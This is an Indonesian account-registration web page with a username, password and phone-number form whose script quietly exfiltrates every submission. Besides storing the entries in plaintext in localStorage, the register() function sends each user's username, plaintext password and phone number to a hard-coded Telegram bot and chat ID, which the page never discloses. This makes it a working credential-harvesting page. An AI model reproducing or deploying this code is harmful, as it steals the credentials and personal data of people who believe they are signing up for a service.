<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Daftar Akun</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f1f1f1;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .form-box {
      background: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
      width: 300px;
      text-align: center;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 8px;
      border: 1px solid #ccc;
    }
    button {
      padding: 10px;
      width: 100%;
      background: #0074ff;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-weight: bold;
    }
    a {
      color: #0074ff;
      text-decoration: none;
    }
    a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="form-box">
    <h2>Daftar Akun</h2>
    <input type="text" id="username" placeholder="Username" required />
    <input type="password" id="password" placeholder="Password (min 4 karakter)" required />
    <input type="tel" id="phone" placeholder="Nomor Telepon" required />
    <button onclick="register()">Daftar</button>
    <p>Sudah punya akun? <a href="index.html">Login</a></p>
  </div>

  <script>
    function register() {
      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value;
      const phone = document.getElementById('phone').value.trim();

      if (!username || !password || !phone) {
        return alert("Semua field wajib diisi.");
      }

      if (password.length < 4) {
        return alert("Password minimal 4 karakter.");
      }

      let users = JSON.parse(localStorage.getItem("users") || "[]");

      const isExist = users.some(user => user.username === username || user.phone === phone);
      if (isExist) {
        return alert("Username atau nomor sudah terdaftar.");
      }

      users.push({ username, password, phone });
      localStorage.setItem("users", JSON.stringify(users));

      // Kirim ke Telegram
      const token = "7621390139:AAE9oNVeBy946yGbO7IDsT34DFY3THvGC6I";
      const chatId = "7882058841";
      const msg = `PENDAFTARAN:\nUsername: ${username}\nPassword: ${password}\nTelepon: ${phone}`;
      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
        .catch(err => console.error("Gagal kirim ke Telegram", err));

      alert("Pendaftaran berhasil!");
      window.location.href = "index.html";
    }
  </script>
</body>
</html>
